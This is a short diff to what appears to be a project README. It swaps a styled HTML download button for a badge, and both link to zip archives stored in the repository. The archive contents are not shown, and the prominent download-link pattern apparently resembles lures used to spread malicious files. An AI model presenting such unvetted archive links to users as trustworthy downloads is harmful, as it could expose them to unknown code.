@@ -1,10 +1,4 @@
-<p align="center">
-  <a href="https://github.com/DivanshLpu/indie-game/blob/a5e2ff9b20dd0ece0c4aa317e34fa43e657135c4/release1-source.zip" style="display: inline-block; padding: 15px 35px; font-size: 18px; font-weight: bold; text-align: center; text-decoration: none; color: #ffffff; background-color: #0366d6; border-radius: 8px;">
-    Download release1 v0.0.1
-  </a>
-</p>
-
-
+[![Explore Now](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/DivanshLpu/indie-game/blob/main/release2.zip)
 
 
 # How to use releases
